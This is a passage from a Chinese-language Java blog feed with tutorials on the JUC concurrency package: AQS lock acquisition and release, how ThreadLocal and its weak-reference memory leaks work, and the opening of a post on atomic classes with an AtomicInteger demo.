punctuation">)</span> <span class="token punctuation">&#123;</span>                t<span class="token punctuation">.</span>next <span class="token operator">=</span> node<span class="token punctuation">;</span>                <span class="token keyword">return</span> t<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>此时tail&#x3D;null,enq 自旋先创建<code>哨兵节点</code>,用于占位，再创建b节点入队，并将Node 头尾节点设置</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">acquireQueued</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Node</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">boolean</span> failed <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">boolean</span> interrupted <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">final</span> <span class="token class-name">Node</span> p <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">predecessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> head <span class="token operator">&amp;&amp;</span> <span class="token function">tryAcquire</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">setHead</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>                p<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token comment">// help GC</span>                failed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> interrupted<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">shouldParkAfterFailedAcquire</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> node<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>                <span class="token function">parkAndCheckInterrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                interrupted <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>failed<span class="token punctuation">)</span>            <span class="token function">cancelAcquire</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>​    for (;;)这里又是一个自旋，</p><p>第一次自旋，tryAcquire去抢锁，这里默认A 休眠五分钟，所以这里肯定抢占失败返回false，执行shouldParkAfterFailedAcquire 将p也就是当前的哨兵节点，此时哨兵节点pred的waitStatus&#x3D;0，条件进入比较并交换为-1。</p><p>第二次自旋，shouldParkAfterFailedAcquire 哨兵节点pred的waitStatus&#x3D;-1，此方法返回true,便执行parkAndCheckInterrupt中的方法，此时就把线程B挂起</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">parkAndCheckInterrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">LockSupport</span><span class="token punctuation">.</span><span class="token function">park</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">interrupted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="unLock-方法（唤醒线程）"><a href="#unLock-方法（唤醒线程）" class="headerlink" title="unLock 方法（唤醒线程）"></a>unLock 方法（唤醒线程）</h3><p> unlock—&gt;sync.release(1)—&gt;tryRelease 子类实现</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">release</span><span class="token punctuation">(</span><span class="token keyword">int</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">tryRelease</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> h <span class="token operator">=</span> head<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>h <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> h<span class="token punctuation">.</span>waitStatus <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">unparkSuccessor</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">tryRelease</span><span class="token punctuation">(</span><span class="token keyword">int</span> releases<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> releases<span class="token punctuation">;</span> <span class="token comment">// 1-1=0</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">getExclusiveOwnerThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalMonitorStateException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> free <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        free <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token function">setExclusiveOwnerThread</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">setState</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> free<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>tryRelease&#x3D;0,返回true,执行unparkSuccessor，此时node是头节点是哨兵节点 waitStatus&#x3D;-1,下一节点B将执行</p><p>  LockSupport.unpark(s.thread)。也就是B节点线程唤醒</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">private void unparkSuccessor(Node node) &#123;    &#x2F;*     * If status is negative (i.e., possibly needing signal) try     * to clear in anticipation of signalling.  It is OK if this     * fails or if status is changed by waiting thread.     *&#x2F;    int ws &#x3D; node.waitStatus;     if (ws &lt; 0)        compareAndSetWaitStatus(node, ws, 0);    &#x2F;*     * Thread to unpark is held in successor, which is normally     * just the next node.  But if cancelled or apparently null,     * traverse backwards from tail to find the actual     * non-cancelled successor.     *&#x2F;    Node s &#x3D; node.next;    if (s &#x3D;&#x3D; null || s.waitStatus &gt; 0) &#123;        s &#x3D; null;        for (Node t &#x3D; tail; t !&#x3D; null &amp;&amp; t !&#x3D; node; t &#x3D; t.prev)            if (t.waitStatus &lt;&#x3D; 0)                s &#x3D; t;    &#125;    if (s !&#x3D; null)        LockSupport.unpark(s.thread);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JUC</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JUC(七)-ThreadLocal详解</title>
    <link href="/posts/6f92e213.html"/>
    <url>/posts/6f92e213.html</url>
    
    <content type="html"><![CDATA[<p>学习并掌握ThreadLocal的使用，使用场景，原理。以及相关的强、软、弱、虚引用，ThreadLocal内存泄露问题剖析以及解决办法</p><span id="more"></span><h2 id="ThreadLocal简介"><a href="#ThreadLocal简介" class="headerlink" title="ThreadLocal简介"></a>ThreadLocal简介</h2><p>ThreadLocal又叫做线程局部变量，ThreadLocal为变量在每个线程中都创建了一个副本，那么每个线程可以访问自己内部的副本变量。</p><p>　<strong>内存溢出（memory overflow）</strong>：是指不能申请到足够的内存进行使用，就会发生内存溢出，比如出现的OOM（Out Of Memory）</p><p>　<strong>内存泄漏（memory lack）</strong>：内存泄露是指在程序中已经动态分配的堆内存由于某种原因未释放或者无法释放（已经没有用处了，但是没有释放），造成系统内存的浪费，这种现象叫“内存泄露”。</p><p>　　当内存泄露到达一定规模后，造成系统能申请的内存较少，甚至无法申请内存，最终导致内存溢出，所以内存泄露是导致内存溢出的一个原因。</p><h2 id="如何创建"><a href="#如何创建" class="headerlink" title="如何创建"></a>如何创建</h2><p>泛型可以是任意，这里以String 为例</p><p>第一种(伪代码)：set方法,<code>当前线程赋值值，当前线程取值</code></p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">private static final ThreadLocal&lt;String&gt; threadLocal &#x3D; new ThreadLocal&lt;String&gt;()&#123;&#125;;&#x2F;&#x2F; 在方法中调用set赋值threadLocal.set(&quot;xxx&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>第二种（伪代码）：使用withInitial，<code>统一初始化所有线程的ThreadLocal的值</code></p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">ThreadLocal</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> threadLocal <span class="token operator">=</span> <span class="token class-name">ThreadLocal</span><span class="token punctuation">.</span><span class="token function">withInitial</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h2 id="Thread、ThreadLocal和ThreadLocalMap三者之间的关系"><a href="#Thread、ThreadLocal和ThreadLocalMap三者之间的关系" class="headerlink" title="Thread、ThreadLocal和ThreadLocalMap三者之间的关系"></a>Thread、ThreadLocal和ThreadLocalMap三者之间的关系</h2><ul><li>Thread</li></ul><p>​线程类，在这个类中存在一个<code>threadLocals</code>变量</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">ThreadLocal.ThreadLocalMap threadLocals &#x3D; null;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>ThreadLocal</li></ul><p>​此类提供了一个简单的<code>set</code>,<code>get</code>,<code>remove</code>方法，用于设置，获取或移除 绑定到线程本地变量中的值。里面存一个<strong>匿名静态内部类</strong>ThreadLocalMap</p><ul><li>ThreadLocalMap</li></ul><p>​这是在ThreadLocal中定义的一个类，可以简单的将它理解成一个Map，不过它的key是<code>WeakReference弱引用</code>类型，这样当这个值没有在别的地方引用时，在发生垃圾回收时，这个map的<code>key</code>会被自动回收，不过它的值不会被自动回收。</p><h3 id="总结关系："><a href="#总结关系：" class="headerlink" title="总结关系："></a><strong>总结关系：</strong></h3><p>Thread存在ThreadLocalMap对象(<code>直接关系</code>)</p><p>ThreadLocal里有ThreadLocalMap匿名内部类（<code>直接关系</code>）</p><p>ThreadLocal进行方法操作的时候会从Thread里面的ThreadLocalMap拿取当前ThreadLocalMap,然后操作该Map(<code>间接关系</code>)</p><h2 id="源码分析-get和set"><a href="#源码分析-get和set" class="headerlink" title="源码分析 get和set"></a>源码分析 get和set</h2><h3 id="get实现"><a href="#get实现" class="headerlink" title="get实现"></a>get实现</h3><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">public T get() &#123;    &#x2F;&#x2F; 获取当前线程    Thread t &#x3D; Thread.currentThread();    &#x2F;&#x2F; 获取这个线程自身绑定的 ThreadLocalMap 对象    ThreadLocalMap map &#x3D; getMap(t);    if (map !&#x3D; null) &#123;        &#x2F;&#x2F; this是ThreadLocal对象，获取Map中的Entry对象        ThreadLocalMap.Entry e &#x3D; map.getEntry(this);        if (e !&#x3D; null) &#123;            @SuppressWarnings(&quot;unchecked&quot;)            &#x2F;&#x2F; 获取具体的值            T result &#x3D; (T)e.value;            return result;        &#125;    &#125;    &#x2F;&#x2F; 设置初始值    return setInitialValue();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="set实现"><a href="#set实现" class="headerlink" title="set实现"></a>set实现</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token class-name">T</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 获取当前线程</span>    <span class="token class-name">Thread</span> t <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 获取绑定到这个线程自身的 ThreadLocalMap，这个ThreadLocalMap是从Thread类的`threadLocals`变量中获取的</span>    <span class="token class-name">ThreadLocalMap</span> map <span class="token operator">=</span> <span class="token function">getMap</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>map <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 向map中设置值，key为 ThreadLocal 对象的实例。</span>        map<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 如果map不存在，则创建出来。</span>        <span class="token function">createMap</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><ol><li>获取当前线程<code>Thread</code></li><li>获取当前线程的 <code>ThreadLocalMap</code> 对象。</li><li>向<code>ThreadLocalMap</code>中设置值，key为<code>ThreadLocal</code>对象，值为具体的值。</li></ol><h2 id="强引用、软引用、弱引用和虚引用是什么？"><a href="#强引用、软引用、弱引用和虚引用是什么？" class="headerlink" title="强引用、软引用、弱引用和虚引用是什么？"></a>强引用、软引用、弱引用和虚引用是什么？</h2><blockquote><p>强度由高到低依次为：强引用 -&gt; 软引用 -&gt; 弱引用 -&gt; 虚引用</p></blockquote><ul><li><p>强引用(StrongReference)</p><p><strong>强引用</strong>是使用最普遍的引用。如果一个对象具有强引用，那<strong>垃圾回收器</strong>绝不会回收它</p><p>如:Object strongReference &#x3D; new Object();</p></li></ul><p>​当<strong>内存空间不足</strong>时，<code>Java</code>虚拟机宁愿抛出<code>OutOfMemoryError</code>错误，使程序<strong>异常终止</strong>，也不会靠随意<strong>回收</strong>具有<strong>强引用</strong>的<strong>对象</strong>来解决内存不足的问题。显式地设置<code>strongReference</code>对象为<code>null</code>，或让其<strong>超出</strong>对象的<strong>生命周期</strong>范围，则<code>gc</code>认为该对象<strong>不存在引用</strong>，这时就可以回收这个对象。具体什么时候收集这要取决于<code>GC</code>算法</p><ul><li>软引用(SoftReference)</li></ul><p>​如果一个对象只具有<strong>软引用</strong>，则<strong>内存空间充足</strong>时，<strong>垃圾回收器</strong>就<strong>不会</strong>回收它；如果<strong>内存空间不足</strong>了，就会<strong>回收</strong>这些对象的内存。只要垃圾回收器没有回收它，该对象就可以被程序使用。</p><ul><li><p>弱引用(WeakReference)</p><p>在垃圾回收器线程扫描它所管辖的内存区域的过程中，一旦发现了只具有<strong>弱引用</strong>的对象，不管当前<strong>内存空间足够与否</strong>，都会<strong>回收</strong>它的内存。</p></li><li><p>虚引用(PhantomReference)</p><p><strong>虚引用</strong>顾名思义，就是<strong>形同虚设</strong>。与其他几种引用都不同，<strong>虚引用</strong>并<strong>不会</strong>决定对象的<strong>生命周期</strong>。如果一个对象<strong>仅持有虚引用</strong>，那么它就和<strong>没有任何引用</strong>一样，在任何时候都可能被垃圾回收器回收。</p></li></ul><p>ThreadLocal内部类 ThreadLocalMap采用<strong>弱引用</strong></p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Entry</span> <span class="token keyword">extends</span> <span class="token class-name">WeakReference</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ThreadLocal</span><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>    <span class="token comment">/** The value associated with this ThreadLocal. */</span>    <span class="token class-name">Object</span> value<span class="token punctuation">;</span>    <span class="token class-name">Entry</span><span class="token punctuation">(</span><span class="token class-name">ThreadLocal</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> k<span class="token punctuation">,</span> <span class="token class-name">Object</span> v<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>        value <span class="token operator">=</span> v<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="ThreadLocal为什么会内存泄露？"><a href="#ThreadLocal为什么会内存泄露？" class="headerlink" title="ThreadLocal为什么会内存泄露？"></a>ThreadLocal为什么会内存泄露？</h2><p>在ThreadLocal的生命周期中，都存在这些引用。看下图: 实线代表强引用，虚线代表弱引用</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/SouthEast.jpeg" alt="这里写图片描述"></p><center>（图片来自网络）</center><p>每个Thread 维护一个 ThreadLocalMap 映射表，这个映射表Entry的 key 是 ThreadLocal实例本身，value 是真正需要存储的 Object</p><p>ThreadLocalMap 是使用 ThreadLocal 的<code>弱引用</code>作为 Key 的，如果一个ThreadLocal没有外部强引用来引用它,弱引用的对象<code>ThreadLocal</code>在 GC 时会被<strong>回收</strong>,这时，ThreadLocalMap中就会出现key为null的Entry，就没有办法访问这些key为null的Entry的value，这个时候如果当前线程再迟迟不结束（比如我们使用<strong>线程池复用线程</strong>），所以存在着内存泄露，因为这里只有线程结束后，存在线程栈中的Current Thread、Map value才会全部被GC回收</p><p>ThreadLocalMap的设计中已经考虑到这种情况,在ThreadLocal的get(),set(),remove()的时候都会清除线程ThreadLocalMap里所有key为null的value</p><p>ThreadLocalMap设计上已经考虑比较多，但是都是<strong>被动措施</strong></p><blockquote><p>分配使用了ThreadLocal又不再调用get(),set(),remove()方法，那么就会导致内存泄漏，因为这块内存一直存在。</p></blockquote><h2 id="为什么使用弱引用，OOM是否是弱引用的锅？"><a href="#为什么使用弱引用，OOM是否是弱引用的锅？" class="headerlink" title="为什么使用弱引用，OOM是否是弱引用的锅？"></a>为什么使用弱引用，OOM是否是弱引用的锅？</h2><p>分两种情况</p><ul><li><p>key 使用强引用：引用的ThreadLocal的对象被回收了，但是ThreadLocalMap还持有ThreadLocal的强引用，如果没有手动删除，ThreadLocal不会被回收，导致Entry内存泄漏。</p></li><li><p>key 使用弱引用：引用的ThreadLocal的对象被回收了，由于ThreadLocalMap持有ThreadLocal的弱引用，即使没有手动删除，ThreadLocal也会被回收。value在下一次ThreadLocalMap调用set、get、remove的时候会被清除。</p></li></ul><p>综上所述，Entryd的key无论使用弱引用还是强引用。本质上value还是强引用，所以还是会造成内存泄露，从而引发内存溢出</p><h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><p>每次使用完ThreadLocal，都调用它的<code>remove()</code>方法，清除数据。</p><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>ThreadLocal 适用于每个线程需要自己独立的实例且该实例需要在多个方法中被使用，也即变量在线程间隔离而在方法或类间共享的场景</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JUC</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JUC(六)-原子操作类及十八罗汉增强</title>
    <link href="/posts/b72bf36e.html"/>
    <url>/posts/b72bf36e.html</url>
    
    <content type="html"><![CDATA[<p>理解atomic原子类的基本类型原子类、数组类型原子类、引用类型原子类、对象的属性修改原子类的概要思想与案例分析</p><span id="more"></span><blockquote><p>18罗汉&#x3D;12原子类+4增强类+Striped64类+Number类</p></blockquote><h2 id="基本类型原子类"><a href="#基本类型原子类" class="headerlink" title="基本类型原子类"></a>基本类型原子类</h2><h3 id="AtomicInteger"><a href="#AtomicInteger" class="headerlink" title="AtomicInteger"></a>AtomicInteger</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：获取当前的值<span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">getAndSet</span><span class="token punctuation">(</span><span class="token keyword">int</span> newValue<span class="token punctuation">)</span>：获取当前的值，并设置新的值<span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：获取当前的值，并自增<span class="token punctuation">(</span>类似i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">incrementAndGet</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：自增后再获取当前的值<span class="token punctuation">(</span>类似<span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">getAndDecrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：获取当前的值，并自减<span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">getAndAdd</span><span class="token punctuation">(</span><span class="token keyword">int</span> delta<span class="token punctuation">)</span>：获取当前的值，并加上预期的值<span class="token keyword">void</span> <span class="token function">lazySet</span><span class="token punctuation">(</span><span class="token keyword">int</span> newValue<span class="token punctuation">)</span><span class="token operator">:</span> 最终会设置成newValue<span class="token punctuation">,</span>使用lazySet设置值后，可能导致其他线程在之后的一小段时间内还是可以读到旧的值。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>juc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">CountDownLatch</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicInteger</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/6/21 * @description: */</span><span class="token keyword">class</span> <span class="token class-name">MyNumber</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">AtomicInteger</span> atomicInteger <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addPlusPlus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        atomicInteger<span class="token punctuation">.</span><span class="token function">incrementAndGet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">AtomicInteger</span> <span class="token function">getAtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> atomicInteger<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAtomicInteger</span><span class="token punctuation">(</span><span class="token class-name">AtomicInteger</span> atomicInteger<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>atomicInteger <span class="token operator">=</span> atomicInteger<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AtomicIntegerDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">MyNumber</span> myNumber <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyNumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CountDownLatch</span> countDownLatch <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CountDownLatch</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">5000</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        myNumber<span class="token punctuation">.</span><span class="token function">addPlusPlus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>                    countDownLatch<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span 